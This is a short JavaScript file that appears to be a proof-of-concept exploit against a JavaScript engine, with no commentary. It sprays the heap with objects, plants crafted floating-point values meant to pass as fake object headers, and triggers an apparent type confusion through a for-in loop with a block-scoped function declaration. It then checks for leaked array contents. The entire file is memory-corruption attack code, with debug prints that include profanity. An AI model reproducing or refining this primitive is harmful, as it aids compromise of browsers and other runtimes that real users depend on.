var spray = [];

function spray_one()
{
    var x = {a: 123};
    x[spray.length+'spray'] = 123;
    spray.push(x);
}

for(var i = 0; i < 0x10000; i++)
    spray_one();

var target = {a: 7.081965076936295e-304, b: false, c: 1234, d: 5678};
var target2 = {a: 7.081965076936295e-304, b: false, c: 1234, e: 5678};

var impl_idx = 0;
function create_impl()
{
    var ans = new Uint8Array(64);
    for(var i = 0; i < 64; i++)
        ans[i] = i;
    for(var i = 0; i < 32; i++)
        ans[(impl_idx++)+'x'] = {};
    for(var i = 0; i < 0x100; i++)
        spray_one();
    return ans;
}

function trigger(x)
{
    if(impl[0])
    {
        print("wtfwtfwtf?");
        while(1);
    }
    var o = {a: 1};
    for(var i in o)
    {
        {
            i = x;
            function i(){}
        }
        o[i];
        //print("xyu!");
    }
    if(impl[0])
    {
        var arr = [];
        for(var i = 0; i < 64; i++)
            arr[i] = impl[i];
        print("julebino! "+arr);
        while(1);
    }
    //print(x.a.a);
    //print(x);
    //print(i);
}

for(var _ = 0; _ < 1024; _++)
{
    var impl = create_impl();
    var s = {a: impl};
    trigger(s);
}

print("fuck!");
